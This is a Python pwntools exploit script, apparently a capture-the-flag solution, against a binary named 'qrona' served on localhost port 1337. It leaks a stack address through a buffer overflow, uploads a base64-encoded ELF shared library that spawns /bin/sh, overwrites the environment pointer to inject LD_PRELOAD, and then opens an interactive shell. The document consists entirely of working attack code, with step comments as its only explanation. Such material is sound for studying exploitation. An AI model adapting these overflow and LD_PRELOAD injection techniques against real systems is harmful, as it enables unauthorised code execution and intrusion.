#!/usr/bin/env python3
from pwn import *
import base64

PROG = './docker/files/qrona'
HOST = 'localhost'
PORT = 1337

ENVP = 0x598

LOCAL = False
if 'local' in sys.argv:
	LOCAL = True

DEBUG = False
if 'debug' in sys.argv:
	DEBUG = True

if LOCAL:
	io = process(PROG)
else:
	io = remote(HOST, PORT)

if DEBUG:
	gdb.attach(io, 'set follow-fork-mode parent\nbrva 0x1ccb\n')

time.sleep(1)

# step 1: leak the stack
io.recvuntil(':\x1b[0m ')
io.send('x'*0x400)

time.sleep(1)

io.recvuntil('decode: ')
leak = io.recvline().strip().ljust(8, b'\x00')
leak = u64(leak)
envp = leak + ENVP

log.info('leak: 0x%012x' % leak)
log.info('envp: 0x%012x' % envp)

io.recvuntil('continue...\n')
io.send('\n')

# step 2: get the file name

data = base64.b64encode(b'hawhaw im so leet')
io.recvuntil(':\x1b[0m ')
io.send(b'x'*0x400+p64(leak)+p8(0x01))

io.recvuntil('continue...\n')
io.send('\n')

io.recvuntil(':\x1b[0m ')
file = io.recvline().strip().decode('utf-8')
name = file[:-6]

log.info('file: %s' % file)
log.info('name: %s' % name)

# step 3: write the shared library to the program
#         but partially corrupt the filename so
#         we pass all the checks but don't delete

lib  = b'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAMcBQV0iJ5us6'
lib += b'AAAAAAAAAC9iaW4vc2gAAAAAAEAAOAACAAEAAAAHAAAA'
lib += b'AAAAAAAAAAAAAAAAAAAAAFBIieKwOw8FkOv1AAAAAADK'
lib += b'AAAAAAAAAAAQAAAAAAAAAgAAAAYAAACaAAAAAAAAAJoA'
lib += b'AAAAAAAASI24nv///+uFAAAAAAAAAAwAAAAAAAAAigAA'
lib += b'AAAAAAAFAAAAAAAAAFVVVVVVVVVVBg=='
lib  = lib.ljust(0x400, b'\x00')

lib += p64(leak)
lib += p8(0x01)
lib += name.encode('utf-8')+b'ABCDEF\x00'

io.recvuntil(':\x1b[0m ')
io.sendline(lib)

io.recvuntil('continue...\n')
io.send('\n')

# step 4: finally we can overwrite the envp so it
#         will contain LD_PRELOAD to our lib

io.recvuntil(':\x1b[0m ')
tmpf = io.recvline().strip()

pay  = b'x'*0x400
pay += p64(leak)
pay += p8(0x01)
pay += tmpf.ljust(0x20, b'\x00')

pay  = pay.ljust(ENVP, b'\x00')
pay += p64(envp + 0x18)
pay += p64(0x00)
pay += p64(0x00)
pay += b'LD_PRELOAD='+file.encode('utf-8')

io.sendline(pay)

io.recvuntil('continue...\n')
io.send('\n')

# step 5: almost there
io.recvuntil(':\x1b[0m ')
io.sendline('SGFja2luZ0ZvclNvam8K')

io.clean()

# step 5: collect a nice juicy shell

print('')
io.sendline('id')
log.success('shell: %s' % io.recvline().strip().decode('utf-8'))

io.interactive()
